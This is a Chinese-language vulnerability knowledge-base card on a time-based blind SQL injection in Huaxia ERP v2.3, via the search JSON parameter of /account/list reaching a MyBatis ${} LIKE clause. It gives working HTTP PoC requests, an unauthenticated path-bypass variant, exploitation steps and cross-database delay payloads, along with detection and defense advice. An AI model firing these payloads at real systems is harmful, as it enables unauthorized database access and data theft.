---
id: web-generic-sqli-xiahuia-erp-account-search-json-like-injection
title: 华夏ERP /account/list 的 search JSON 进入 MyBatis LIKE '%${name}%' 时间盲注
type: scenario
domain: web
path: web/generic/sqli
technique: erp-search-json-mybatis-like-injection
tags:
- sqli
- java
- mybatis
- dollar-brace
- like-injection
- time-blind
- xiahuia
- erp
cve: []
severity: high
confidence: high
affected_versions: 华夏ERP v2.3（原文测试版本）
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V38
  verified_at: '2026-11-05T06:01:07+08:00'
  notes: 已通读原文并逐张核对41张图：StringUtil.getInfo 用 JSONObject.parseObject(search) 解析、search.name 经 ResourceController.getList/{apiName}/list→CommonQueryManager 进入 MyBatis LIKE '%${userName}%'（原文以 UserMapperEx.selectByConditionUser 展示调用链），实测 name=1' or sleep(5)-- 两次响应 10049/10053ms、正常约110ms，且 /.css/../account/list 无 Cookie 变体同样生效，均与卡一致；卡内已注明 account 接口拼接为原文实测、以 UserMapperEx 为代表。版本为原文审计目标 v2.3（卡内标注原文测试版本）。frontmatter 无 sources/source_url；未在本机复跑。
url: /docs/web/generic/sqli/web-generic-sqli-xiahuia-erp-account-search-json-like-injection/
draft: false
kb_aliases:
- 华夏ERP SQL 注入
- account/list search 注入
- MyBatis LIKE ${} 注入
- StringUtil.getInfo JSON 注入
- 结算账户 时间盲注
---

## 一句话结论

华夏ERP v2.3 的 `/account/list` 把 `search` 参数当作 JSON 解析，取出的 `name` 值一路传到 MyBatis 的 `LIKE '%${userName}%'`；`${}` 是 SQL 文本替换而非预编译，攻击者在 `name` 中闭合单引号并注入 `or sleep(5)-- `，即可通过响应时间确认时间盲注，配合 Filter 的 `.css/../` 路径绕过还能未授权利用。

## 原理

- 请求 `GET /account/list?search={"name":"...","serialNo":"","remark":""}&currentPage=1&pageSize=15`。
- `StringUtil.getInfo(search, key)` 的实现：
  ```java
  public static String getInfo(String search, String key) {
      String value = "";
      if (search != null) {
          JSONObject obj = JSONObject.parseObject(search);
          value = obj.getString(key);
          if (value.equals("")) value = null;
      }
      return value;
  }
  ```
  `search` 是用户可控 JSON，`name` 字段被取出后进入查询参数 Map。
- Mapper 中使用文本替换而非预编译：
  ```xml
  <if test="userName != null">
      and user.username like '%${userName}%'
  </if>
  ```
  以 `UserMapperEx.selectByConditionUser` 为代表（原文展示的调用链）；`/account/list` 的 `search.name` 同样进入 LIKE 拼接（原文实测）。
- 因为 `${}` 在 SQL 解析前直接替换，`name` 里的单引号会闭合 `'%...%'` 的字符串上下文，后续 `or sleep(5)-- ` 成为 SQL 语法，MySQL 执行 `SLEEP(5)`，响应时间显著增加。
- 反向追踪路径：Mapper XML `${}` → Mapper 接口 → Service/Component → Controller；注意参数类型，`int` 类型的参数无法注入字符串 payload。
- 该接口还受 `LogCostFilter` 保护，但 Filter 的静态后缀白名单可用 `/.css/../account/list` 绕过（见关联卡），因此可未授权注入。

## 触发条件

- 华夏ERP v2.3，`/account/list`（或同类列表接口）的 `search` JSON 中 `name` 进入 MyBatis `LIKE '%${...}%'`。
- 后端数据库为 MySQL（`sleep()` 可用）；其他数据库需换对应延时函数。
- 参数未被白名单/转义处理，且 `name` 为字符串类型。
- 若需未授权，Filter 存在可绕过的路径判断（本环境可用 `/.css/../`）。

## 利用步骤

1. 正常请求 `/account/list?search={"name":"","serialNo":"","remark":""}`，确认返回账户列表与分页结构。
2. 构造 `name` 为 `1' or sleep(5)-- `，JSON 编码后作为 `search` 发送，观察响应时间是否增加约 5 秒。
3. 先带 Cookie 验证注入，再尝试 `/.css/../account/list?...` 去掉 Cookie 验证未授权。
4. 用布尔/时间条件提取数据；确认后可交给 sqlmap（`--data`/URL 编码需保持 JSON 结构）。
5. 排查同类接口：Mapper XML 中所有 `LIKE '%${...}%'`、`${}` 拼接点，以及 `ResourceController.getList` 等共用 `CommonQueryManager` 的入口。

## PoC

正常请求：

```http
GET /account/list?search=%7B%22name%22%3A%22%22%2C%22serialNo%22%3A%22%22%2C%22remark%22%3A%22%22%7D&currentPage=1&pageSize=15 HTTP/1.1
Host: target:8080
```

时间盲注（原文实测响应约 10050ms）：

```http
GET /account/list?search=%7B%22name%22%3A%221%27+or+sleep%285%29--+%22%2C%22serialNo%22%3A%22%22%2C%22remark%22%3A%22%22%7D&currentPage=1&pageSize=15 HTTP/1.1
Host: target:8080
```

解码后的 `search`：

```json
{"name":"1' or sleep(5)-- ","serialNo":"","remark":""}
```

未授权变体（利用 `.css` 静态后缀白名单）：

```http
GET /.css/../account/list?search=%7B%22name%22%3A%221%27+or+sleep%285%29--+%22%2C%22serialNo%22%3A%22%22%2C%22remark%22%3A%22%22%7D&currentPage=1&pageSize=15 HTTP/1.1
Host: target:8080
```

成功标志：响应时间稳定增加约 5 秒（原文为 10 秒左右），而正常请求约 100ms。

## 变体与关联

- 注入位置：`search.name`、`serialNo`、`remark` 等 JSON 字段都可能进入不同查询条件；逐一替换测试。
- 数据库变体：MySQL 用 `sleep()`，MSSQL 用 `WAITFOR DELAY`，Oracle 用 `dbms_pipe.receive_message`，PostgreSQL 用 `pg_sleep()`。
- 关联：[[web-generic-sqli-mybatis-dollar-brace-injection]]（MyBatis `${}` 五类拼接点的通用原理）；[[web-generic-auth-xiahuia-erp-logcostfilter-contains-path-bypass]]（同一系统的未授权绕过，可让本注入前台可达）。
- 关联：[[web-generic-sqli-like-clause-append-search]]（LIKE 拼接注入的通用形态）。
- 边界：若 Mapper 改为 `#{}` 预编译、对 `search` 做字段白名单/转义，或参数为数值类型，则失效。

## 检测与防御

- 检测：`search` 参数中出现单引号、`or`、`sleep(`、`--`、`/*` 等；JSON 字段值含 SQL 关键字；响应时间异常（同一接口从百毫秒级升到数秒）。
- 检测：MyBatis 日志/数据库慢查询中出现 `like '%1' or sleep(5)-- %'` 类拼接；未登录来源（结合 Filter 绕过路径）访问列表接口。
- 防御：Mapper 改用 `#{}` 预编译，LIKE 写成 `like concat('%', #{userName}, '%')`；无法预编译的标识符位置用白名单。
- 防御：对 `search` JSON 做 schema 校验，只允许预定义字段与类型；对 `name` 做长度/字符白名单。
- 防御：修复 Filter 的 `contains`/静态后缀白名单绕过，敏感接口在 Controller 层再次鉴权；数据库账号最小权限。
- 加固：关闭详细 SQL 报错，统一慢查询与异常监控；对时间盲注做响应时间基线告警。
